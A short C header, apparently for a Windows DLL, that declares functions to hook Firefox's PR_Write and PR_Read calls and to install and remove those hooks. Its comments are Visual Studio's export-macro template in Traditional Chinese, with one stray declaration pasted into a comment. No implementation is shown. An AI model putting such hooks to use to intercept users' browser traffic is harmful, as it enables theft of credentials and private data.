// 下列 ifdef 區塊是建void UninstallHooks();立巨集的標準方式，讓從 DLL 匯出的過程更簡單。
// 此 DLL 中的所有檔案均使用命令列中定義的 HOOKFIREFOX_EXPORTS 來編譯。
// 此符號不應在其他使用此 DLL 的任何專案中定義
// 這樣一來，原始程式檔中包含此檔案的其他任何專案，
// 都會將 HOOKFIREFOX_API 函式視為從 DLL 匯入，
// 而此 DLL 會將使用此巨集定義的符號視為匯出。
#ifdef HOOKFIREFOX_EXPORTS
#define HOOKFIREFOX_API __declspec(dllexport)
#else
#define HOOKFIREFOX_API __declspec(dllimport)
#endif

void HookFireFox(void);
int HookedPR_Write(void* fd, char* buf, int amount);
int HookedPR_Read(void* fd, void* buf, int amount);
BOOL InstallHooks();
void UninstallHooks();
